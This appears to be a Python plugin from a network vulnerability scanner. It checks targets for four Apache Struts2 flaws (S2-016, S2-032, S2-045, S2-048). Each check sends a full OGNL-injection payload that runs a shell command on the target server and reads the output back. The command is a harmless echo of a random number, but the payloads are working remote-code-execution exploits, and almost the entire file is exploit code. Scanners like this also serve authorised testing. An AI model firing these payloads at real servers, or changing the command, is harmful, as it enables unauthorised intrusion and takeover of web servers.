# author: al0ne
# https://github.com/al0ne

import random
import requests
import http.client
from urllib import request
from lib.verify import get_list
from lib.random_header import get_ua

vuln = ['java', 'jsp']


class struts():
    def __init__(self, ip):
        self.url = ip
        self.result = []
        self.random = random.randint(100000000, 200000000)
        self.win = 'set /a ' + str(self.random)
        self.linux = 'echo ' + str(self.random)
        self.timeout = 3

    def st016(self):
        payload = r"/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + self.linux + "%27%29.getInputStream%28%29%29%7D"
        try:
            r = requests.get(self.url + payload, headers=get_ua(), allow_redirects=False)
            if str(self.random) in r.headers['Location'] and len(r.headers['Location']) < 15:
                self.result.append('Apache S2-016 Vulnerability: ' + self.url)
        except:
            pass

    def st032(self):
        payload = r"/?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd={}&pp=\\A&ppp=%20&encoding=UTF-8".format(
            self.linux)
        try:
            r = requests.get(self.url + payload, headers=get_ua(), timeout=self.timeout)
            if str(self.random) in r.text and len(r.text) < 11:
                self.result.append('Apache S2-032 Vulnerability: ' + self.url)
        except:
            pass

    def st045(self):
        try:
            cmd = self.linux
            header = dict()
            header[
                "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
            header[
                "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#iswin?(#cmd='" + cmd + "'):(#cmd='" + cmd + "')).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            r = request.Request(self.url, headers=header)
            text = request.urlopen(r).read()
        except http.client.IncompleteRead as e:
            text = e.partial
        except:
            pass
        if 'text' in locals().keys():
            self.random = str(self.random)
            if self.random.encode('utf-8') in text and len(text) < 15:
                self.result.append('Apache S2-045 Vulnerability: ' + self.url)

    def st048(self):
        cmd = self.linux
        payload = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27" + cmd + "%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123"
        payload = payload.encode('utf-8')
        try:
            r = request.urlopen(self.url + '/integration/saveGangster.action', payload)
            text = r.read()
        except http.client.IncompleteRead as e:
            text = e.partial
        except:
            pass
        if 'text' in locals().keys():
            self.random = str(self.random)
            if self.random.encode('utf-8') in text and len(text) < 15:
                self.result.append('Apache S2-048 Vulnerability: ' + self.url)

    def run(self):
        self.st032()
        self.st045()
        self.st016()
        self.st048()
        return self.result


def check(ip, ports, apps):
    output = []
    probe = get_list(ip, ports)
    for i in probe:
        output.extend(struts(i).run())
    return output
